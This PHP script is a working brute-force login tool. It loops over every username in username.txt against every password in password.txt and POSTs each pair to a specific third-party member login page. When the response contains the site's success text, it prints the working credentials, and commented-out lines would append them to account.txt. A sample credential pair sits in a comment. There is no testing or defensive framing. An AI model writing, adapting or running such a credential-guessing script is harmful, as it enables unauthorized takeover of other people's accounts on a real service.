<?php
header("Content-type:text/html;charset=gbk");
set_time_limit(0);
/**  
 * $post_string = "app=request&version=beta";  
 * request_by_curl('http://www.qianyunlai.com/restServer.php', $post_string);  
 */  
function request_by_curl($remote_server, $post_string) {
  $return = false;
  $ch = curl_init();  
  curl_setopt($ch, CURLOPT_URL, $remote_server);  
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'mypost=' . $post_string);  
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
  curl_setopt($ch, CURLOPT_USERAGENT, "qianyunlai.com's CURL Example beta");  
  $data = curl_exec($ch);
  curl_close($ch);
  if(false !== strpos(strip_tags($data), '³É¹¦')){
    $return = true;
  }
  return $return;  
}
//$post_string = "id=&username=900700&passwd=88844"; 
//$a = request_by_curl('http://vip.88854.com/huiyuan/getin.cgi', $post_string);
//var_dump($a);die;

$username = file('username.txt');
$passwd = file('password.txt');
$handle = fopen('account.txt', 'a+');
$url = 'http://vip.88854.com/huiyuan/getin.cgi';
foreach($username as $user){
  foreach ($passwd as $key => $pass) {
    echo $post_string = "id=&username=".trim($user)."&passwd=".trim($pass);
    if($temp = request_by_curl($url, $post_string)){
		echo $post_string.'<br />';die;
      //fwrite($handle, $post_string."\r\n");
	  //fclose($handle);
	  //die;
    }
  }
}

?>